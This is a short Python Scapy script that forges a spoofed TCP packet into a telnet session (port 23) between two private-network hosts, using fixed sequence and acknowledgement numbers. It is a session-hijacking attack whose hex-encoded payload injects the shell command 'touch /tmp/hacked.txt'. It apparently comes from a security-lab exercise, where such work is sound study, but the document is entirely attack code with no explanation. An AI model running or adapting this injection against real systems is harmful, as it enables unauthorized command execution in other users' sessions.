#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.5", dst="10.0.2.4")
tcp = TCP(sport=53860, dport=23, flags="", seq=106663924, ack=2645790003)
data = "0a20746f756368202f746d702f6861636b65642e747874200a"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

